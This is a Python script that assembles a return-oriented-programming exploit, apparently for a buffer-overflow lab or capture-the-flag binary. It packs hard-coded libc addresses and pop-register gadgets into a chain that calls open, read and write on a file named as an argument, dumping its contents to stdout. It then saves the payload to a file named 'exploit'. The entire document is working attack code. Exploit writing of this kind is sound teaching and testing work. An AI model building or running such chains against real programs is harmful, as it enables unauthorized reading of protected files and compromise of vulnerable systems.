import sys
import os


"""
open function: 0x7ffff7b04130
read function: 0x7ffff7b04350
write function:  0x7ffff7b043b0
area to read and write: 0x00007ffff7dd3000 to 0x00007ffff7dd7000 

0x00000000004008c3 : (5fc3)	pop    rdi;	ret
0x00007ffff7a2d2f8 : (5ec3)	pop    rsi;	ret libc
0x00007ffff7a0eb92 : (5ac3)	pop    rdx;	ret libc
^gadgets
"""

def pack64(n):
	s = ""
	while n:
		s += chr(n % 0x100)
		n = n / 0x100
	s = s.ljust(8, "\x00")
	return s

#functions
open_func = pack64(0x7ffff7b04130)
read_func = pack64(0x7ffff7b04350)
write_func = pack64(0x7ffff7b043b0)
exit_func = pack64(0x7ffff7a47040)

# gadgets
pop_rdi = pack64(0x00000000004008c3)
pop_rsi = pack64(0x00007ffff7a2d2f8)
pop_rdx = pack64(0x00007ffff7a0eb92)

#area to start read and write
area = pack64(0x00007ffff7dd3000)

# File name given as input argument, convert file name into bytes with encode()
FILENAME = sys.argv[1].encode()

#Size of file (564 bytes)
FILE_STATS = os.stat(FILENAME)
FILE_SIZE = FILE_STATS.st_size

#null termiante the file
FILENAME += b"\x00"

# address of the top of the buffer to put the name of the file
#fileName_addr = pack64(0x7fffffffdd80) #This is the one used inside of gdb
fileName_addr = pack64(0x7fffffffddc0) # This is the one used outside of gdb

EXPLOIT = b""
EXPLOIT += FILENAME
EXPLOIT += (56 - len(FILENAME)) * b"A" #how much dummy data is determined by the length of the filename given

#calling open(filename, 0)
EXPLOIT += pop_rdi
EXPLOIT += fileName_addr #first arugment
EXPLOIT += pop_rsi
EXPLOIT += pack64(0x0) #second argument, 0
EXPLOIT += open_func

#calling read(3, area, bytes) where bytes is the size of the file which is 0x234 in hex
EXPLOIT += pop_rdi
EXPLOIT += pack64(0x3) #fd is 3 cause sequential
EXPLOIT += pop_rsi
EXPLOIT += area
EXPLOIT += pop_rdx
EXPLOIT += pack64(0x234)
EXPLOIT += read_func

#calling write(1, area, bytes)
EXPLOIT += pop_rdi
EXPLOIT += pack64(0x1) #first argument, 1
EXPLOIT += pop_rsi
EXPLOIT += area
EXPLOIT += pop_rdx
EXPLOIT += pack64(0x234)
EXPLOIT += write_func

#exit cleanly
EXPLOIT += exit_func

with open("exploit", "wb") as f:
    f.write(EXPLOIT)
